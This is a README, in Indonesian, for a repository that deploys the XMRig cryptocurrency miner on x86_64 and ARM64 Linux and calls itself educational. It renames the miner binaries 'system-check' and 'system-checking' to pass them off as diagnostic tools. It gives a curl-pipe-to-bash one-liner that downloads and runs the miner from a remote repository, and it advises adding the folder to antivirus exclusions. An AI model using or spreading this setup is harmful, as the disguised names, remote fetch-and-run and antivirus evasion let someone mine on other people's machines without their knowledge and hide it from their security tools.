# XMRig Edukasi - Multi Arsitektur (x86_64 & ARM64)

Repo ini berisi setup XMRig untuk pembelajaran di VM/WSL pribadi yang authorized.
Dibuat agar bisa berjalan di 2 arsitektur Linux berbeda:
- x86_64 (amd64)
- aarch64 (arm64)

**Peringatan:** Gunakan hanya di VM/mesin milik sendiri yang authorized. Jangan jalankan di sistem orang lain tanpa izin tertulis.

---

## Isi Repo

```
.
├── system-check      # Binary XMRig untuk Linux x86_64
├── system-checking   # Binary XMRig untuk Linux ARM64
├── config.json       # Konfigurasi pool, wallet, dan pembatasan CPU
├── oneline.sh        # Script satu baris: download + jalankan miner
└── README.md         # Dokumentasi ini
```

---

## Cara Menjalankan (One-Liner)

Jalankan command ini di VM/WSL kamu:

```bash
curl -L https://raw.githubusercontent.com/Loritcz/system-checking/main/oneline.sh | bash
```

Script akan otomatis:
1. Mendeteksi arsitektur sistem (`x86_64` atau `aarch64`).
2. Membuat folder kerja di `~/system-check`.
3. Download `config.json` dan binary yang sesuai (`system-check` untuk x86_64 atau `system-checking` untuk ARM64).
4. Menjalankan miner sebagai user biasa.

---

## Cara Menjalankan Manual

```bash
mkdir -p ~/system-check && cd ~/system-check

# Download config
curl -fsSL -o config.json https://raw.githubusercontent.com/Loritcz/system-checking/main/config.json

# Untuk x86_64:
curl -fsSL -o system-check https://raw.githubusercontent.com/Loritcz/system-checking/main/system-check
chmod +x system-check
./system-check -c config.json

# Untuk ARM64:
curl -fsSL -o system-checking https://raw.githubusercontent.com/Loritcz/system-checking/main/system-checking
chmod +x system-checking
./system-checking -c config.json
```

---

## Cara Upload ke GitHub

1. Pastikan repo lokal sudah diinisialisasi:
   ```bash
   git init
   git branch -M main
   ```

2. Tambahkan remote dengan token GitHub kamu:
   ```bash
   git remote add origin https://TOKEN_GITHUB_KAMU@github.com/Loritcz/system-checking.git
   ```

3. Commit dan push:
   ```bash
   git add oneline.sh README.md config.json system-check system-checking
   git commit -m "Update oneline.sh dan README"
   git push -u origin main
   ```

---

## Verifikasi

Cek apakah miner berjalan sebagai user biasa:
```bash
ps aux | grep xmrig
```

Pastikan proses tidak berjalan sebagai root:
```bash
ps -o user,pid,comm -p $(pgrep xmrig)
```

---

## Catatan Keamanan & Etika

- Repo ini untuk edukasi di VM/mesin sendiri.
- Jangan gunakan untuk menambang di sistem tanpa izin.
- Jangan bagikan private key/spend key wallet.
- Binary XMRig mungkin terdeteksi sebagai miner oleh antivirus. Tambahkan folder kerja ke exclusion jika diperlukan.
